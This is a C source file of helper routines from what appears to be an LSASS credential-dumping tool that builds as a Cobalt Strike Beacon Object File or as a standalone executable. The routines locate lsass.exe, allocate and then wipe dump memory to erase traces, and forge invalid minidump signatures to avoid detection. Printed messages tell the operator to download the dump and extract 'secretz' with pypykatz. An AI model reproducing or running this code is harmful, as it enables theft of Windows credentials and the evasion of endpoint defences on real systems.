#include "../include/utils.h"
#include "../include/handle.h"
#include "../include/syscalls.h"

PVOID get_process_image(HANDLE hProcess)
{
    NTSTATUS status;
    ULONG BufferLength = 0x200;
    PVOID buffer;
    do
    {
        buffer = intAlloc(BufferLength);
        if (!buffer)
        {
#ifdef DEBUG
#ifdef BOF
            BeaconPrintf(CALLBACK_ERROR,
#else
            printf(
#endif
                "Failed to call HeapAlloc for 0x%llx bytes, error: %ld\n",
                BufferLength,
                GetLastError()
            );
#endif
            return NULL;
        }
        status = NtQueryInformationProcess(
            hProcess,
            ProcessImageFileName,
            buffer,
            BufferLength,
            &BufferLength
        );
        if (NT_SUCCESS(status))
            return buffer;

        intFree(buffer); buffer = NULL;
    } while (status == STATUS_INFO_LENGTH_MISMATCH);

#ifdef DEBUG
#ifdef BOF
    BeaconPrintf(CALLBACK_ERROR,
#else
    printf(
#endif
        "Failed to call NtQueryInformationProcess, status: 0x%lx\n",
        status
    );
#endif
    return NULL;
}

BOOL is_lsass(HANDLE hProcess)
{
    PUNICODE_STRING image = get_process_image(hProcess);
    if (!image)
        return FALSE;

    if (image->Length == 0)
    {
        intFree(image); image = NULL;
        return FALSE;
    }

    if (wcsstr(image->Buffer, L"\\Windows\\System32\\lsass.exe"))
    {
        intFree(image); image = NULL;
        return TRUE;
    }

    intFree(image); image = NULL;
    return FALSE;
}

DWORD get_pid(
    HANDLE hProcess
)
{
    PROCESS_BASIC_INFORMATION basic_info;
    PROCESSINFOCLASS ProcessInformationClass = 0;
    NTSTATUS status = NtQueryInformationProcess(
        hProcess,
        ProcessInformationClass,
        &basic_info,
        sizeof(PROCESS_BASIC_INFORMATION),
        NULL
    );
    if (!NT_SUCCESS(status))
    {
#ifdef DEBUG
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Failed to call NtQueryInformationProcess, status: 0x%lx\n",
            status
        );
#endif
        return 0;
    }

    return basic_info.UniqueProcessId;
}

DWORD get_lsass_pid(void)
{
    DWORD pid;
    HANDLE hProcess = find_lsass(PROCESS_QUERY_INFORMATION);
    if (!hProcess)
        return 0;
    pid = get_pid(hProcess);
    NtClose(hProcess); hProcess = NULL;
    return pid;
}

void print_success(LPCSTR dump_name, BOOL use_valid_sig, BOOL do_write, BOOL is_BOF)
{
    if (!use_valid_sig)
    {
#ifdef BOF
        BeaconPrintf(CALLBACK_OUTPUT,
#else
        printf(
#endif
            "The minidump has an invalid signature, restore it running:\nbash restore_signature.sh %s",
            do_write? &strrchr(dump_name, '\\')[1] : dump_name
        );
    }
    if (do_write)
    {
        if (is_BOF)
        {
#ifdef BOF
            BeaconPrintf(CALLBACK_OUTPUT,
#else
            printf(
#endif
                "Done, to download the dump run:\ndownload %s\nto get the secretz run:\npython3 -m pypykatz lsa minidump %s",
                dump_name,
                &strrchr(dump_name, '\\')[1]
            );
        }
        else
        {
#ifdef BOF
            BeaconPrintf(CALLBACK_OUTPUT,
#else
            printf(
#endif
                "Done, to get the secretz run:\npython3 -m pypykatz lsa minidump %s",
                &strrchr(dump_name, '\\')[1]
            );
        }
    }
    else
    {
#ifdef BOF
        BeaconPrintf(CALLBACK_OUTPUT,
#else
        printf(
#endif
            "Done, to get the secretz run:\npython3 -m pypykatz lsa minidump %s",
            dump_name
        );
    }
}

void free_linked_list(
    PVOID head
)
{
    if (!head)
        return;

    Plinked_list node = (Plinked_list)head;
    ULONG32 number_of_nodes = 0;
    while (node)
    {
        number_of_nodes++;
        node = node->next;
    }

    for (int i = number_of_nodes - 1; i >= 0; i--)
    {
        Plinked_list node = (Plinked_list)head;

        int jumps = i;
        while (jumps--)
            node = node->next;

        intFree(node); node = NULL;
    }
}

PVOID allocate_memory(
    PSIZE_T RegionSize
)
{
    PVOID BaseAddress = NULL;
    NTSTATUS status = NtAllocateVirtualMemory(
        NtCurrentProcess(),
        &BaseAddress,
        0,
        RegionSize,
        MEM_COMMIT,
        PAGE_READWRITE
    );
    if (!NT_SUCCESS(status))
    {
#ifdef DEBUG
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Could not allocate enough memory to write the dump\n"
        );
#endif
        return NULL;
    }
    return BaseAddress;
}

void encrypt_dump(
    Pdump_context dc
)
{
    // add your code here
    return;
}

void erase_dump_from_memory(
    Pdump_context dc
)
{
    // delete all trace of the dump from memory
    memset(dc->BaseAddress, 0, dc->rva);
    // free the memory area where the dump was
    PVOID BaseAddress = dc->BaseAddress;
    SIZE_T RegionSize = dc->DumpMaxSize;
    NTSTATUS status = NtFreeVirtualMemory(
        NtCurrentProcess(),
        &BaseAddress,
        &RegionSize,
        MEM_RELEASE
    );
    if (!NT_SUCCESS(status))
    {
#ifdef DEBUG
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Failed to call NtFreeVirtualMemory, status: 0x%lx\n",
            status
        );
#endif
    }
}

void generate_invalid_sig(
    PULONG32 Signature,
    PSHORT Version,
    PSHORT ImplementationVersion
)
{
    time_t t;
    srand((unsigned) time(&t));

    *Signature = MINIDUMP_SIGNATURE;
    *Version = MINIDUMP_VERSION;
    *ImplementationVersion = MINIDUMP_IMPL_VERSION;
    while (*Signature == MINIDUMP_SIGNATURE ||
           *Version == MINIDUMP_VERSION ||
           *ImplementationVersion == MINIDUMP_IMPL_VERSION)
    {
        *Signature = 0;
        *Signature |= (rand() & 0x7FFF) << 0x11;
        *Signature |= (rand() & 0x7FFF) << 0x02;
        *Signature |= (rand() & 0x0003) << 0x00;

        *Version = 0;
        *Version |= (rand() & 0xFF) << 0x08;
        *Version |= (rand() & 0xFF) << 0x00;

        *ImplementationVersion = 0;
        *ImplementationVersion |= (rand() & 0xFF) << 0x08;
        *ImplementationVersion |= (rand() & 0xFF) << 0x00;
    }
}
